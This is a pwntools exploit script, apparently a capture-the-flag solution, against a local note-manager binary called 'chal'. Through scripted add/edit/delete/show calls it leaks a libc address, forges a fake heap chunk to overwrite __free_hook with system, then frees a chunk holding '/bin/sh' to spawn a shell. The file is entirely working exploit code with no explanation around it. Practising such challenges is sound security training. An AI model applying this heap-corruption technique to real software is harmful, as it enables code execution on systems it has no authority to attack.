from pwn import *

context.arch='amd64';context.terminal=['tmux','splitw','-h']
r = process("./chal")

#add( 0, "A"*8 )
r.sendlineafter(b"5. bye\n> ",b"1")
r.sendlineafter(b"index\n> ",b"0")
r.sendlineafter(b"note name\n> ",b"A"*8)
print("add0")


#edit( 0, 0x418, "A")
r.sendlineafter(b"5. bye\n> ",b"2")
r.sendlineafter(b"index\n> ",b"0")
r.sendlineafter(b"size\n> ",b"1048") #0x1048
r.send(b"A")
print("edit0")

#add(1. "B"*8 )
r.sendlineafter(b"5. bye\n> ",b"1")
r.sendlineafter(b"index\n> ",b"1")
r.sendlineafter(b"note name\n> ",b"B"*8)
print("add1")


#edit(1, 0x18, "B" )
r.sendlineafter(b"5. bye\n> ",b"2")
r.sendlineafter(b"index\n> ",b"1")
r.sendlineafter(b"size\n> ",b"24") #0x18
r.send(b"B")
print("edit1")

#add(2,"C"*8)
r.sendlineafter(b"5. bye\n> ",b"1")
r.sendlineafter(b"index\n> ",b"2")
r.sendlineafter(b"note name\n> ",b"C"*8)
print("add2")

#delete(0)
r.sendlineafter(b"5. bye\n> ",b"3")
r.sendlineafter(b"index\n> ",b"0")

#show()
r.sendlineafter(b"5. bye\n> ",b"4")

r.recvuntil(b'data: ')
libc = u64(r.recv(6).ljust(8, b'\x00')) - 0x1ecbe0
free_hook = libc + 0x1eee48
system = libc + 0x52290
info(f"libc: {hex(libc)}")

fake_chunk = flat(
    0,  0x21,
    b'CCCCCCCC', b'CCCCCCCC',
    free_hook
    )




data = b'/bin/sh\x00'.ljust(0x10,b'B')

#edit( 1, 0x38, data + fake_chunk )
r.sendlineafter(b"5. bye\n> ",b"2")
r.sendlineafter(b"index\n> ",b"1")
r.sendlineafter(b"size\n> ",b"56") 
r.send( data + fake_chunk ) 


#edit( 2, 0x8, p64(system) )
r.sendlineafter(b"5. bye\n> ",b"2")
r.sendlineafter(b"index\n> ",b"2")
r.sendlineafter(b"size\n> ",b"8") 
r.send( p64(system) ) 


#delete(1)
r.sendlineafter(b"5. bye\n> ",b"3")
r.sendlineafter(b"index\n> ",b"1")



#r.sendlineafter()
gdb.attach(r)
r.interactive()



